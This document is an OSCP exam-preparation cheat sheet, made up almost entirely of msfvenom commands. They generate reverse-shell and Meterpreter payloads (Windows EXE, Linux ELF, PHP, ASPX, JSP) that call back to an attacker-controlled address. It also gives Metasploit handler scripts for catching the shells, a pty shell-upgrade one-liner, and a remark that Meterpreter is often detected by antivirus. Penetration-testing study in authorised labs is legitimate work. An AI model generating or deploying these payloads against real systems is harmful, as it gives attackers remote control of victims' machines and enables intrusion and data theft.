# MSFvenom Cheatsheet (OSCP)

## General Notes
- Prefer non-Meterpreter shells for OSCP unless Meterpreter is required.
- Verify LHOST, LPORT, and architecture (x86 vs x64).
- Stageless payloads are usually more reliable.
- Meterpreter is often detected by AV.

---

## Non-Meterpreter Reverse Shells

### Windows Reverse Shell (cmd)

#### x64 EXE
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe
```

#### x86 EXE
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell32.exe
```

---

### Linux Reverse Shell

#### x64 ELF
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell.elf
```

#### x86 ELF
```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell32.elf
```

---

### Script-Based Payloads

#### PHP Reverse Shell
```bash
msfvenom -p php/reverse_php LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.php
```

#### ASPX Reverse Shell
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f aspx -o shell.aspx
```

#### JSP Reverse Shell
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.jsp
```

---

## Non-Meterpreter Listener (.rc)

### Windows Example
```text
use exploit/multi/handler
set payload windows/x64/shell_reverse_tcp
set LHOST 10.10.14.5
set LPORT 4444
set ExitOnSession false
exploit -j
```

Run:
```bash
msfconsole -r shell_listener.rc
```

---

## Meterpreter Payloads

### Windows Meterpreter
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=5555 -f exe -o meter.exe
```

### Linux Meterpreter
```bash
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=5555 -f elf -o meter.elf
```

---

## Meterpreter Listener (.rc)

### Windows Meterpreter Listener
```text
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_tcp
set LHOST 10.10.14.5
set LPORT 5555
set ExitOnSession false
exploit -j
```

### Linux Meterpreter Listener
```text
use exploit/multi/handler
set payload linux/x64/meterpreter_reverse_tcp
set LHOST 10.10.14.5
set LPORT 5555
set ExitOnSession false
exploit -j
```

---

## Shell Upgrade Tip
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
